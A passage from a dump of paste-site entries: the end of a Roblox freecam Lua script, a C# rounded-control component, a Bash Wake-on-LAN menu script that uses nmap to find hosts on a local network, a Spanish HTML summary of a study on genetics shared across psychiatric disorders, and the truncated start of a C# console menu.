			return (exp(K_CURVATURE*x) - 1)/(exp(K_CURVATURE) - 1)
		end

		local function fDeadzone(x)
			return fCurve((x - K_DEADZONE)/(1 - K_DEADZONE))
		end

		function thumbstickCurve(x)
			return sign(x)*clamp(fDeadzone(abs(x)), 0, 1)
		end
	end

	local gamepad = {
		ButtonX = 0,
		ButtonY = 0,
		DPadDown = 0,
		DPadUp = 0,
		ButtonL2 = 0,
		ButtonR2 = 0,
		Thumbstick1 = Vector2.new(),
		Thumbstick2 = Vector2.new(),
	}

	local keyboard = {
		W = 0,
		A = 0,
		S = 0,
		D = 0,
		E = 0,
		Q = 0,
		U = 0,
		H = 0,
		J = 0,
		K = 0,
		I = 0,
		Y = 0,
		Up = 0,
		Down = 0,
		LeftShift = 0,
		RightShift = 0,
		F7 = 0,
	}

	local mouse = {
		Delta = Vector2.new(),
		MouseWheel = 0,
	}

	local NAV_GAMEPAD_SPEED  = Vector3.new(1, 1, 1)
	local NAV_KEYBOARD_SPEED = Vector3.new(1, 1, 1)
	local PAN_MOUSE_SPEED    = Vector2.new(1, 1)*(pi/64)
	local PAN_GAMEPAD_SPEED  = Vector2.new(1, 1)*(pi/8)
	local FOV_WHEEL_SPEED    = 1.0
	local FOV_GAMEPAD_SPEED  = 0.25
	local NAV_ADJ_SPEED      = 0.75
	local NAV_SHIFT_MUL      = 0.25

	local navSpeed = 1

	function Input.Vel(dt)
		navSpeed = clamp(navSpeed + dt*(keyboard.Up - keyboard.Down)*NAV_ADJ_SPEED, 0.01, 4)

		local kGamepad = Vector3.new(
			thumbstickCurve(gamepad.Thumbstick1.X),
			thumbstickCurve(gamepad.ButtonR2) - thumbstickCurve(gamepad.ButtonL2),
			thumbstickCurve(-gamepad.Thumbstick1.Y)
		)*NAV_GAMEPAD_SPEED

		local kKeyboard = Vector3.new(
			keyboard.D - keyboard.A + keyboard.K - keyboard.H,
			keyboard.E - keyboard.Q + keyboard.I - keyboard.Y,
			keyboard.S - keyboard.W + keyboard.J - keyboard.U
		)*NAV_KEYBOARD_SPEED

		local shift = UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) or UserInputService:IsKeyDown(Enum.KeyCode.RightShift)

		return (kGamepad + kKeyboard)*(navSpeed*(shift and NAV_SHIFT_MUL or 1))
	end

	function Input.Pan(dt)
		local kGamepad = Vector2.new(
			thumbstickCurve(gamepad.Thumbstick2.Y),
			thumbstickCurve(-gamepad.Thumbstick2.X)
		)*PAN_GAMEPAD_SPEED
		local kMouse = mouse.Delta*PAN_MOUSE_SPEED
		mouse.Delta = Vector2.new()
		return kGamepad + kMouse
	end

	function Input.Fov(dt)
		local kGamepad = (gamepad.ButtonX - gamepad.ButtonY)*FOV_GAMEPAD_SPEED
		local kMouse = mouse.MouseWheel*FOV_WHEEL_SPEED
		mouse.MouseWheel = 0
		return kGamepad + kMouse
	end

	do
		local function Keypress(action, state, input)
			keyboard[input.KeyCode.Name] = state == Enum.UserInputState.Begin and 1 or 0
			return Enum.ContextActionResult.Sink
		end

		local function GpButton(action, state, input)
			gamepad[input.KeyCode.Name] = state == Enum.UserInputState.Begin and 1 or 0
			return Enum.ContextActionResult.Sink
		end

		local function MousePan(action, state, input)
			local delta = input.Delta
			mouse.Delta = Vector2.new(-delta.y, -delta.x)
			return Enum.ContextActionResult.Sink
		end

		local function Thumb(action, state, input)
			gamepad[input.KeyCode.Name] = input.Position
			return Enum.ContextActionResult.Sink
		end

		local function Trigger(action, state, input)
			gamepad[input.KeyCode.Name] = input.Position.z
			return Enum.ContextActionResult.Sink
		end

		local function MouseWheel(action, state, input)
			mouse[input.UserInputType.Name] = -input.Position.z
			return Enum.ContextActionResult.Sink
		end

		local function Zero(t)
			for k, v in pairs(t) do
				t[k] = v*0
			end
		end

		function Input.StartCapture()
			ContextActionService:BindActionAtPriority(""FreecamKeyboard"", Keypress, false, INPUT_PRIORITY,
				Enum.KeyCode.W, Enum.KeyCode.U,
				Enum.KeyCode.A, Enum.KeyCode.H,
				Enum.KeyCode.S, Enum.KeyCode.J,
				Enum.KeyCode.D, Enum.KeyCode.K,
				Enum.KeyCode.E, Enum.KeyCode.I,
				Enum.KeyCode.Q, Enum.KeyCode.Y,
				Enum.KeyCode.Up, Enum.KeyCode.Down,
				Enum.KeyCode.F7
			)
			ContextActionService:BindActionAtPriority(""FreecamMousePan"",          MousePan,   false, INPUT_PRIORITY, Enum.UserInputType.MouseMovement)
			ContextActionService:BindActionAtPriority(""FreecamMouseWheel"",        MouseWheel, false, INPUT_PRIORITY, Enum.UserInputType.MouseWheel)
			ContextActionService:BindActionAtPriority(""FreecamGamepadButton"",     GpButton,   false, INPUT_PRIORITY, Enum.KeyCode.ButtonX, Enum.KeyCode.ButtonY)
			ContextActionService:BindActionAtPriority(""FreecamGamepadTrigger"",    Trigger,    false, INPUT_PRIORITY, Enum.KeyCode.ButtonR2, Enum.KeyCode.ButtonL2)
			ContextActionService:BindActionAtPriority(""FreecamGamepadThumbstick"", Thumb,      false, INPUT_PRIORITY, Enum.KeyCode.Thumbstick1, Enum.KeyCode.Thumbstick2)
		end

		function Input.StopCapture()
			navSpeed = 1
			Zero(gamepad)
			Zero(keyboard)
			Zero(mouse)
			ContextActionService:UnbindAction(""FreecamKeyboard"")
			ContextActionService:UnbindAction(""FreecamMousePan"")
			ContextActionService:UnbindAction(""FreecamMouseWheel"")
			ContextActionService:UnbindAction(""FreecamGamepadButton"")
			ContextActionService:UnbindAction(""FreecamGamepadTrigger"")
			ContextActionService:UnbindAction(""FreecamGamepadThumbstick"")
		end
	end
end

------------------------------------------------------------------------

local function StepFreecam(dt)
	local vel = velSpring:Update(dt, Input.Vel(dt))
	local pan = panSpring:Update(dt, Input.Pan(dt))
	local fov = fovSpring:Update(dt, Input.Fov(dt))

	local zoomFactor = sqrt(tan(rad(70/2))/tan(rad(cameraFov/2)))

	cameraFov = clamp(cameraFov + fov*FOV_GAIN*(dt/zoomFactor), 1, 120)
	cameraRot = cameraRot + pan*PAN_GAIN*(dt/zoomFactor)
	cameraRot = Vector2.new(clamp(cameraRot.x, -PITCH_LIMIT, PITCH_LIMIT), cameraRot.y%(2*pi))

	local cameraCFrame = CFrame.new(cameraPos)*CFrame.fromOrientation(cameraRot.x, cameraRot.y, 0)*CFrame.new(vel*NAV_GAIN*dt)
	cameraPos = cameraCFrame.p

	Camera.CFrame = cameraCFrame
	Camera.Focus = cameraCFrame 
	Camera.FieldOfView = cameraFov
end

local function CheckMouseLockAvailability()
	local devAllowsMouseLock = Players.LocalPlayer.DevEnableMouseLock
	local devMovementModeIsScriptable = Players.LocalPlayer.DevComputerMovementMode == Enum.DevComputerMovementMode.Scriptable
	local userHasMouseLockModeEnabled = GameSettings.ControlMode == Enum.ControlMode.MouseLockSwitch
	local userHasClickToMoveEnabled =  GameSettings.ComputerMovementMode == Enum.ComputerMovementMode.ClickToMove
	local MouseLockAvailable = devAllowsMouseLock and userHasMouseLockModeEnabled and not userHasClickToMoveEnabled and not devMovementModeIsScriptable

	return MouseLockAvailable
end

------------------------------------------------------------------------

local PlayerState = {} do
	local mouseBehavior
	local mouseIconEnabled
	local cameraType
	local cameraFocus
	local cameraCFrame
	local cameraFieldOfView
	local screenGuis = {}
	local coreGuis = {
		Backpack = true,
		Chat = true,
		Health = true,
		PlayerList = true,
	}
	local setCores = {
		BadgesNotificationsActive = true,
		PointsNotificationsActive = true,
	}

	-- Save state and set up for freecam
	function PlayerState.Push()
		for name in pairs(coreGuis) do
			coreGuis[name] = StarterGui:GetCoreGuiEnabled(Enum.CoreGuiType[name])
			StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType[name], false)
		end
		for name in pairs(setCores) do
			setCores[name] = StarterGui:GetCore(name)
			StarterGui:SetCore(name, false)
		end
		local playergui = LocalPlayer:FindFirstChildOfClass(""PlayerGui"")
		if playergui then
			for _, gui in pairs(playergui:GetChildren()) do
				if gui:IsA(""ScreenGui"") and gui.Enabled then
					screenGuis[#screenGuis + 1] = gui
					gui.Enabled = false
				end
			end
		end

		cameraFieldOfView = Camera.FieldOfView
		Camera.FieldOfView = 70

		cameraType = Camera.CameraType
		Camera.CameraType = Enum.CameraType.Custom

		cameraCFrame = Camera.CFrame
		cameraFocus = Camera.Focus

		mouseIconEnabled = UserInputService.MouseIconEnabled
		UserInputService.MouseIconEnabled = false

		if FFlagUserExitFreecamBreaksWithShiftlock and CheckMouseLockAvailability() then
			mouseBehavior = Enum.MouseBehavior.Default
		else
			mouseBehavior = UserInputService.MouseBehavior
		end
		UserInputService.MouseBehavior = Enum.MouseBehavior.Default
	end

	-- Restore state
	function PlayerState.Pop()
		for name, isEnabled in pairs(coreGuis) do
			StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType[name], isEnabled)
		end
		for name, isEnabled in pairs(setCores) do
			StarterGui:SetCore(name, isEnabled)
		end
		for _, gui in pairs(screenGuis) do
			if gui.Parent then
				gui.Enabled = true
			end
		end

		Camera.FieldOfView = cameraFieldOfView
		cameraFieldOfView = nil

		Camera.CameraType = cameraType
		cameraType = nil

		Camera.CFrame = cameraCFrame
		cameraCFrame = nil

		Camera.Focus = cameraFocus
		cameraFocus = nil

		UserInputService.MouseIconEnabled = mouseIconEnabled
		mouseIconEnabled = nil

		UserInputService.MouseBehavior = mouseBehavior
		mouseBehavior = nil
	end
end

local function StartFreecam()
	if FFlagUserShowGuiHideToggles then
		script:SetAttribute(FREECAM_ENABLED_ATTRIBUTE_NAME, true)
	end

	local cameraCFrame = Camera.CFrame
	cameraRot = Vector2.new(cameraCFrame:toEulerAnglesYXZ())
	cameraPos = cameraCFrame.p
	cameraFov = Camera.FieldOfView

	velSpring:Reset(Vector3.new())
	panSpring:Reset(Vector2.new())
	fovSpring:Reset(0)

	PlayerState.Push()
	RunService:BindToRenderStep(""Freecam"", Enum.RenderPriority.Camera.Value, StepFreecam)
	Input.StartCapture()
end

local function StopFreecam()
	if FFlagUserShowGuiHideToggles then
		script:SetAttribute(FREECAM_ENABLED_ATTRIBUTE_NAME, false)
	end

	Input.StopCapture()
	RunService:UnbindFromRenderStep(""Freecam"")
	PlayerState.Pop()
end

------------------------------------------------------------------------

do
	local enabled = false

	local function ToggleFreecam()
		if enabled then
			StopFreecam()
		else
			StartFreecam()
		end
		enabled = not enabled
	end

	local function CheckMacro(macro)
		for i = 1, #macro - 1 do
			if not UserInputService:IsKeyDown(macro[i]) then
				return
			end
		end
		ToggleFreecam()
	end

	local function HandleActivationInput(action, state, input)
		if state == Enum.UserInputState.Begin then
			if input.KeyCode == _G.FREECAM_MACRO_KB[#_G.FREECAM_MACRO_KB] then
				CheckMacro(_G.FREECAM_MACRO_KB)
			end
		end
		return Enum.ContextActionResult.Pass
	end

	ContextActionService:BindActionAtPriority(""FreecamToggle"", HandleActivationInput, false, TOGGLE_INPUT_PRIORITY, _G.FREECAM_MACRO_KB[#_G.FREECAM_MACRO_KB])

	if FFlagUserShowGuiHideToggles then
		script:SetAttribute(FREECAM_ENABLED_ATTRIBUTE_NAME, enabled)
		script:GetAttributeChangedSignal(FREECAM_ENABLED_ATTRIBUTE_NAME):Connect(function()
			local attributeValue = script:GetAttribute(FREECAM_ENABLED_ATTRIBUTE_NAME)

			if typeof(attributeValue) ~= ""boolean"" then
				script:SetAttribute(FREECAM_ENABLED_ATTRIBUTE_NAME, enabled)
				return
			end

			-- If the attribute's value and `enabled` var don't match, pick attribute value as 
			-- source of truth
			if attributeValue ~= enabled then
				if attributeValue then
					StartFreecam()
					enabled = true
				else
					StopFreecam()
					enabled = false
				end
			end
		end)
	end
end
"
mEzgRLBX,Ellipse Control,WerriorCheats,C#,Tuesday 17th of June 2025 03:42:49 PM CDT,"using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Ellipse_Control
{
    internal class EllipseTool : Component
    {
        [DllImport(""Gdi32.dll"", SetLastError = true)]
        private static extern IntPtr CreateRoundRectRgn(
    int nLeftRect,
    int nTopRect,
    int nRightRect,
    int nBottomRect,
    int nWidthEllipse,
    int nHeightEllipse);

        private Control _targetControl;
        private int _cornerRadius = 30;
        private readonly EventHandler _sizeChangedHandler;

        public EllipseTool()
        {
            _sizeChangedHandler = new EventHandler(OnControlSizeChanged);
        }

        [Category(""Appearance"")]
        public Control TargetControl
        {
            get => _targetControl;
            set
            {
                if (_targetControl != null)
                {
                    _targetControl.SizeChanged -= _sizeChangedHandler;
                }
                _targetControl = value;
                if (_targetControl != null)
                {
                    _targetControl.SizeChanged += _sizeChangedHandler;
                    UpdateRegion();
                }
            }
        }
        [Category(""Appearance"")]
        public int CornerRadius
        {
            get => _cornerRadius;
            set
            {
                _cornerRadius = value;
                UpdateRegion();
            }
        }

        private void OnControlSizeChanged(object sender, EventArgs e)
        {
            UpdateRegion();
        }

        private void UpdateRegion()
        {
            if (_targetControl == null || _targetControl.IsDisposed) return;

            IntPtr regionHandle = CreateRoundRectRgn(
                0, 0,
                _targetControl.Width + 1,
                _targetControl.Height + 1,
                _cornerRadius,
                _cornerRadius);
            _targetControl.Region = Region.FromHrgn(regionHandle);
        }
    }
}
"
BzMmjfPB,Ultimate Wake On Lan Bash Script,KC9UZR,Bash,Tuesday 17th of June 2025 03:29:18 PM CDT,"#!/bin/bash

# =======================================================
# ============= Ultimate Wake On Lan v1.3 ===============
# =======================================================
# Adds a fully automatic scan/wake mode and more output.
#
# USAGE:
# Make it executable: chmod +x wakeup.sh
# Run with sudo:      sudo ./wakeup.sh

# --- Configuration ---
NETWORK=""192.168.1.0/24""
KNOWN_HOSTS_FILE=""${HOME}/.wol_known_hosts""

# --- Color Definitions ---
RED='\033[0;31m'
L_RED='\033[1;31m'
GREEN='\033[0;32m'
L_GREEN='\033[1;32m'
YELLOW='\033[0;33m'
L_YELLOW='\033[1;33m'
BLUE='\033[0;34m'
L_BLUE='\033[1;34m'
MAGENTA='\033[0;35m'
L_MAGENTA='\033[1;35m'
CYAN='\033[0;36m'
L_CYAN='\033[1;36m'
WHITE='\033[1;37m'
BOLD='\033[1m'
NC='\033[0m' # No Color

# --- Core Functions ---

check_tools() {
  local missing_tools=0
  for tool in ""$@""; do
    if ! command -v ""$tool"" &> /dev/null; then echo -e ""${RED}Error: Required command '${BOLD}$tool${RED}' is not installed.${NC}""; missing_tools=1; fi
  done
  if [ $missing_tools -ne 0 ]; then
    echo -e ""\n${YELLOW}Please install the missing tools to proceed.${NC}""; echo ""On Debian/Ubuntu: ${CYAN}sudo apt-get install nmap wakeonlan${NC}""; echo ""On Fedora/CentOS: ${CYAN}sudo dnf install nmap wakeonlan${NC}""; exit 1
  fi
}

scan_network() {
  local nmap_flags=""$1""
  echo -e ""---------------------------------------------------------""
  echo -e ""${CYAN}Starting network scan on ${BOLD}${NETWORK}${CYAN} with flags: ${BOLD}${nmap_flags}${NC}""
  echo -e ""${YELLOW}Displaying nmap output live. This may take a while.${NC}""
  echo -e ""---------------------------------------------------------""
  
  local nmap_output_file=$(mktemp)
  local start_time=$(date +%s)
  
  # Increased verbosity to -vv for more output
  nmap -vv ${nmap_flags} ""${NETWORK}"" | tee ""$nmap_output_file""
  
  local end_time=$(date +%s)
  local duration=$((end_time - start_time))
  
  echo -e ""---------------------------------------------------------""
  echo -e ""${GREEN}Parsing results...${NC}""
  
  local devices
  devices=$(awk -v ip_color=""$L_GREEN"" -v mac_color=""$L_CYAN"" -v nc=""$NC"" \
      '/Nmap scan report for/{ip=$5} /MAC Address:/{mac=$3; vendor=substr($0, index($0,$4)); printf ""%s%s%s %s%s%s %s\n"", ip_color, ip, nc, mac_color, mac, nc, vendor}' ""$nmap_output_file"")
  
  local device_count
  # Use xargs to trim whitespace from wc -l output
  device_count=$(echo ""$devices"" | wc -l | xargs)

  echo -e ""${L_GREEN}${BOLD}Scan Complete.${NC} Found ${WHITE}${BOLD}${device_count}${NC} devices in ${WHITE}${BOLD}${duration}${NC} seconds.""
  echo -e ""---------------------------------------------------------""

  rm ""$nmap_output_file""
  # Return the found devices for further action
  echo ""$devices""
}

wake_device() {
  local mac=$1
  echo -e ""\n${MAGENTA}Sending Wake-on-LAN packet to ${L_CYAN}${BOLD}${mac}${MAGENTA}...${NC}""
  wakeonlan ""${mac}""; echo -e ""${GREEN}Packet sent.${NC}""
}

# --- Menu Functions ---

action_menu() {
  local devices=""$1""
  echo -e ""${BLUE}${BOLD}--- Scan Results ---${NC}""
  echo -e ""${WHITE}$(echo -e ""$devices"" | cat -n)${NC}""
  read -p ""Save these devices to the known hosts list? (y/N): "" save_choice
  if [[ ""$save_choice"" =~ ^[Yy]$ ]]; then
    touch ""$KNOWN_HOSTS_FILE""
    echo -e ""$devices"" | sed -r 's/\x1b\[[0-9;]*m//g' | while read -r device_line; do
      local mac=$(echo ""$device_line"" | awk '{print $2}'); if ! grep -qF ""$mac"" ""$KNOWN_HOSTS_FILE""; then echo ""$device_line"" >> ""$KNOWN_HOSTS_FILE""; echo -e ""${GREEN}Saved:${NC} $device_line""; fi
    done
  fi
  PS3=$(echo -e ""\n${YELLOW}Please choose an action: ${NC}"")
  local action_options=(""Wake a Specific Device from Scan"" ""Wake All Devices from Scan"" ""Done"")
  select action in ""${action_options[@]}""; do
    case $action in
      ""Wake a Specific Device from Scan"")
        local device_options; mapfile -t device_options <<< ""$devices""; device_options+=(""Cancel"")
        PS3=$(echo -e ""${YELLOW}Enter number of device to wake: ${NC}"")
        select choice in ""${device_options[@]}""; do
          if [[ ""$choice"" == ""Cancel"" ]]; then break; fi; if [[ -n ""$choice"" ]]; then wake_device ""$(echo -e ""$choice"" | sed -r 's/\x1b\[[0-9;]*m//g' | awk '{print $2}')""; break; else echo -e ""${RED}Invalid selection.${NC}""; fi
        done; break ;;
      ""Wake All Devices from Scan"") echo -e ""$devices"" | sed -r 's/\x1b\[[0-9;]*m//g' | awk '{print $2}' | while read -r mac; do wake_device ""$mac""; done; break ;;
      ""Done"") break ;;
      *) echo -e ""${RED}Invalid option $REPLY${NC}"" ;;
    esac
  done
}

timing_menu() {
  local profile_flags=""$1""
  echo -e ""${L_BLUE}${BOLD}--- Step 2: Choose Scan Speed ---${NC}""
  PS3=$(echo -e ""\n${YELLOW}Aggressive (T4) is best for fast networks. Use Polite (T2) if you see errors.${NC}\nSelect a timing template: "")
  local timing_options=(""Paranoid (T0)"" ""Sneaky (T1)"" ""Polite (T2)"" ""Normal (T3)"" ""Aggressive (T4)"" ""Insane (T5)"" ""Cancel"")
  select timing_choice in ""${timing_options[@]}""; do
    local timing_flag=""""; case $timing_choice in ""Paranoid (T0)"") timing_flag=""-T0"";; ""Sneaky (T1)"") timing_flag=""-T1"";; ""Polite (T2)"") timing_flag=""-T2"";; ""Normal (T3)"") timing_flag=""-T3"";; ""Aggressive (T4)"") timing_flag=""-T4"";; ""Insane (T5)"") timing_flag=""-T5"";; ""Cancel"") return;; *) echo -e ""${RED}Invalid option $REPLY${NC}""; continue;; esac
    local devices; devices=$(scan_network ""${profile_flags} ${timing_flag}"")
    if [ -z ""$devices"" ]; then echo -e ""${YELLOW}No devices with discoverable MAC addresses were found.${NC}""; else action_menu ""$devices""; fi
    break
  done
}

scan_profile_menu() {
  echo -e ""${L_BLUE}${BOLD}--- Step 1: Choose Scan Profile ---${NC}""
  PS3=$(echo -e ""\n${YELLOW}Select what you want to find: ${NC}"")
  local profile_options=(""Simple Host List (for WOL)"" ""Quick Port Scan"" ""Full TCP Port Scan"" ""Aggressive Scan (OS, Version)"" ""Back to Main Menu"")
  select opt in ""${profile_options[@]}""; do
    local nmap_params=""""; case $opt in ""Simple Host List (for WOL)"") nmap_params=""-sn"";; ""Quick Port Scan"") nmap_params=""-F"";; ""Full TCP Port Scan"") nmap_params=""-p-"";; ""Aggressive Scan (OS, Version)"") nmap_params=""-A"";; ""Back to Main Menu"") return;; *) echo -e ""${RED}Invalid option $REPLY${NC}""; continue;; esac
    timing_menu ""$nmap_params""; break
  done
}

automatic_wake_all() {
  echo -e ""${L_BLUE}${BOLD}--- Automatic Scan & Wake All ---${NC}""
  # Use the fastest, most reliable scan for finding WOL-ready hosts on a LAN.
  local nmap_params=""-sn -T4""
  local devices
  devices=$(scan_network ""$nmap_params"")

  if [ -z ""$devices"" ]; then
    echo -e ""\n${YELLOW}No devices were found to wake up.${NC}""
  else
    echo -e ""\n${GREEN}Waking up all discovered devices...${NC}""
    # Extract just the MAC address (2nd column after stripping colors) and wake each one
    echo -e ""$devices"" | sed -r 's/\x1b\[[0-9;]*m//g' | awk '{print $2}' | while read -r mac; do
      wake_device ""$mac""
    done
    echo -e ""\n${GREEN}${BOLD}All WOL packets have been sent!${NC}""
  fi
}

direct_wake_menu() { # (Unchanged)
  echo -e ""${L_MAGENTA}${BOLD}--- Direct Wake ---${NC}""; read -p ""Enter the MAC address to wake: "" mac_address
  if [[ ""$mac_address"" =~ ^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$ ]]; then wake_device ""$mac_address""; else echo -e ""${RED}Invalid MAC address format.${NC}""; fi
}

change_network_menu() { # (Unchanged)
  echo -e ""${L_MAGENTA}${BOLD}--- Change Network Target ---${NC}""; echo -e ""Current network target is: ${L_CYAN}${NETWORK}${NC}""
  read -p ""Enter new network target in CIDR format (e.g., 10.0.0.0/24): "" new_network
  if [ -n ""$new_network"" ]; then NETWORK=""$new_network""; echo -e ""${GREEN}Network target updated to ${BOLD}${NETWORK}${NC} for this session.""; else echo -e ""${RED}No input provided.${NC}""; fi
}

saved_hosts_menu() { # (Unchanged)
  echo -e ""${L_MAGENTA}${BOLD}--- Wake from Saved List ---${NC}""
  if [[ ! -f ""$KNOWN_HOSTS_FILE"" || ! -s ""$KNOWN_HOSTS_FILE"" ]]; then echo -e ""${YELLOW}Known hosts file is empty.${NC}""; return; fi
  echo -e ""${WHITE}Available saved hosts:${NC}""; awk -v ip_color=""$L_GREEN"" -v mac_color=""$L_CYAN"" -v nc=""$NC"" '{printf ""%s%s%s %s%s%s %s\n"", ip_color, $1, nc, mac_color, $2, nc, substr($0, index($0,$3))}' ""$KNOWN_HOSTS_FILE"" | cat -n
  PS3=$(echo -e ""\n${YELLOW}Choose an option for saved hosts: ${NC}""); local saved_options=(""Wake a Specific Saved Host"" ""Wake ALL Saved Hosts"" ""Delete a Saved Host"" ""Cancel"")
  select opt in ""${saved_options[@]}""; do
    case $opt in
      ""Wake a Specific Saved Host""|""Delete a Saved Host"") local device_options; mapfile -t device_options < ""$KNOWN_HOSTS_FILE""; device_options+=(""Cancel""); PS3=$(echo -e ""${YELLOW}Select a host to ${opt// a Saved Host/}: ${NC}""); select choice in ""${device_options[@]}""; do if [[ ""$choice"" == ""Cancel"" ]]; then break; fi; if [[ -n ""$choice"" ]]; then if [[ ""$opt"" == ""Wake a Specific Saved Host"" ]]; then wake_device ""$(echo ""$choice"" | awk '{print $2}')""; else grep -vFw ""$choice"" ""$KNOWN_HOSTS_FILE"" > ""$KNOWN_HOSTS_FILE.tmp"" && mv ""$KNOWN_HOSTS_FILE.tmp"" ""$KNOWN_HOSTS_FILE""; echo -e ""${GREEN}Deleted entry:${NC} $choice""; fi; break; else echo -e ""${RED}Invalid selection.${NC}""; fi; done; break ;;
      ""Wake ALL Saved Hosts"") awk '{print $2}' ""$KNOWN_HOSTS_FILE"" | while read -r mac; do wake_device ""$mac""; done; break ;;
      ""Cancel"") break ;;
      *) echo -e ""${RED}Invalid option $REPLY${NC}"";;
    esac
  done
}

help_menu() {
    echo -e ""${L_MAGENTA}${BOLD}--- Help & Information ---${NC}""
    echo -e ""Welcome to the ${BOLD}Ultimate Wake On Lan${NC} script (v1.3).""
    echo -e ""\n${BOLD}Menu Options:${NC}""
    echo -e ""  ${L_RED}Automatic Scan & Wake:${NC} The express option. Immediately scans for all devices""
    echo -e ""                       on the network and sends a WOL packet to each one.""
    echo -e ""  ${L_GREEN}Manual Scan Network:${NC}   Provides full control over the scan. You first choose a""
    echo -e ""                       Scan Profile (what to look for), then a Timing Template""
    echo -e ""                       (how fast to scan).""
    echo -e ""  ${L_CYAN}Saved & Direct Wake:${NC} Wake devices from your saved list or by entering a""
    echo -e ""                       MAC address manually.""
    echo -e ""\n${BOLD}Scan Timing (-T0 to -T5):${NC}""
    echo -e ""  If you get ${L_RED}timeout errors${NC}, your network can't keep up. Slow down the scan!""
    echo -e ""  ${L_GREEN}-T4 (Aggressive):${NC} Recommended for fast, modern LANs.""
    echo -e ""  ${L_YELLOW}-T3 (Normal):${NC}      Nmap's default behavior.""
    echo -e ""  ${L_RED}-T2 (Polite):${NC}       Slower scan that uses less bandwidth. Try this if T4/T3 fail.""
}

main_menu() {
  while true; do
    echo -e ""${L_RED}${BOLD}U${L_YELLOW}l${L_GREEN}t${L_CYAN}i${L_BLUE}m${L_MAGENTA}a${L_RED}t${L_YELLOW}e ${L_GREEN}W${L_CYAN}a${L_BLUE}k${L_MAGENTA}e ${L_RED}O${L_YELLOW}n ${L_GREEN}L${L_CYAN}a${L_BLUE}n${NC} ${WHITE}v1.3${NC}""
    echo -e ""${BLUE}=======================================================${NC}""
    echo -e ""  Network Target: ${L_CYAN}${BOLD}${NETWORK}${NC}""
    echo -e ""${BLUE}=======================================================${NC}""

    PS3=$(echo -e ""\n${WHITE}${BOLD}Select an option: ${NC}"")
    local options=(
      ""$(echo -e ""${L_RED}🚀${NC} Automatic Scan & Wake All"")""
      ""$(echo -e ""${L_GREEN}★${NC} Manual Scan Network"")""
      ""$(echo -e ""${L_CYAN}★${NC} Wake from Saved List"")""
      ""$(echo -e ""${L_BLUE}★${NC} Wake a MAC Address Directly"")""
      ""$(echo -e ""${L_MAGENTA}★${NC} Change Network Target"")""
      ""$(echo -e ""${L_YELLOW}★${NC} Help & Information"")""
      ""$(echo -e ""${WHITE}★${NC} Exit"")""
    )
    select opt in ""${options[@]}""; do
      local clean_opt; clean_opt=$(echo ""$opt"" | sed -r 's/\x1b\[[0-9;]*m//g' | sed -r 's/🚀 |★ //g')
      case ""$clean_opt"" in
        ""Automatic Scan & Wake All"") automatic_wake_all; break ;;
        ""Manual Scan Network"") scan_profile_menu; break ;;
        ""Wake from Saved List"") saved_hosts_menu; break ;;
        ""Wake a MAC Address Directly"") direct_wake_menu; break ;;
        ""Change Network Target"") change_network_menu; break ;;
        ""Help & Information"") help_menu; break ;;
        ""Exit"") echo -e ""${GREEN}Exiting. Goodbye!${NC}""; exit 0 ;;
        *) echo -e ""${RED}Invalid option $REPLY. Please choose a number from the list.${NC}"" ;;
      esac
    done
    echo -e ""\n${YELLOW}Press any key to return to the main menu...${NC}""
    read -n 1 -s -r
    clear
  done
}

# --- Script Start ---
clear
check_tools ""nmap"" ""wakeonlan""
if [ ""$EUID"" -ne 0 ]; then echo -e ""${RED}${BOLD}Root Access Required${NC}\n${YELLOW}Please run with sudo for best results.${NC}""; exit 1; fi
main_menu"
s1CzCjxu,genetica8desordenes,Pasticho,Smarty,Tuesday 17th of June 2025 03:17:10 PM CDT,"{* Base genética compartida entre trastornos psiquiátricos *}

<h1>🧬 Base genética compartida entre trastornos psiquiátricos</h1>

<p>Un estudio reciente publicado en la revista <em>Cell</em> identifica variantes genéticas compartidas entre ocho trastornos psiquiátricos:</p>

<ul>
  <li>Autismo</li>
  <li>TDAH (Trastorno por Déficit de Atención e Hiperactividad)</li>
  <li>Esquizofrenia</li>
  <li>Trastorno bipolar</li>
  <li>Depresión mayor</li>
  <li>Síndrome de Tourette</li>
  <li>Trastorno obsesivo-compulsivo (TOC)</li>
  <li>Anorexia nerviosa</li>
</ul>

<p>Estas variantes afectan genes que codifican funciones esenciales en el cerebro, lo que podría explicar la superposición de síntomas entre estos trastornos.</p>

<hr>

<h2>🧠 Funciones cerebrales codificadas por estos genes</h2>

<p>El análisis de las variantes genéticas reveló que muchas de ellas influyen en genes activos durante el desarrollo cerebral, especialmente en etapas tempranas. Estas variantes afectan proteínas que interactúan dentro de redes neuronales.</p>

<h3>Funciones más afectadas:</h3>
<ul>
  <li><strong>Desarrollo y diferenciación neuronal</strong>: Genes involucrados en la formación y especialización de las neuronas.</li>
  <li><strong>Conectividad sináptica</strong>: Proteínas que regulan la comunicación entre neuronas.</li>
  <li><strong>Plasticidad neuronal</strong>: Capacidad del cerebro para adaptarse y reorganizarse.</li>
  <li><strong>Regulación de la expresión génica</strong>: Control de la activación de genes durante el desarrollo cerebral.</li>
</ul>

<p>Estas funciones son fundamentales para el funcionamiento adecuado del cerebro. Su alteración puede contribuir al desarrollo de trastornos psiquiátricos.</p>

<hr>

<h2>🔬 Implicaciones para el tratamiento</h2>

<p>Comprender cómo estas variantes genéticas afectan funciones cerebrales específicas puede ayudar a:</p>
<ul>
  <li>Desarrollar tratamientos más <strong>precisos</strong> y <strong>eficaces</strong>.</li>
  <li>Diseñar terapias que aborden <strong>las causas subyacentes</strong> de los trastornos.</li>
  <li>Avanzar hacia la <strong>medicina personalizada en psiquiatría</strong>, permitiendo intervenciones adaptadas a cada individuo.</li>
</ul>

<p>Este enfoque representa un avance significativo frente al tratamiento tradicional, que a menudo solo aborda los síntomas.</p>

<blockquote>
  📚 Fuente: Estudio publicado en <em>Cell</em> sobre la base genética común de trastornos psiquiátricos.
</blockquote>
"
Ud1bTzVG,SimpleConsoleMenu,MustyElbow,C#,Tuesday 17th of June 2025 03:13:35 PM CDT,"using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Mail;
using System.Text;
using System.Threading.Tasks;

namespace CommandMenu
{
    internal class Program
    {
        static void Main(string[] args)
        {
            const string CommandToShowRandomText =  ""Text"";
            const string CommandToShowRandomNumber = ""Number"";
            const string CommandToClearConsole = ""Clear"";
            const string CommandToExit = ""Exit"";

            string text1 = ""Случайный текст 1"";
            string text2 = ""Случайный текст 2"";
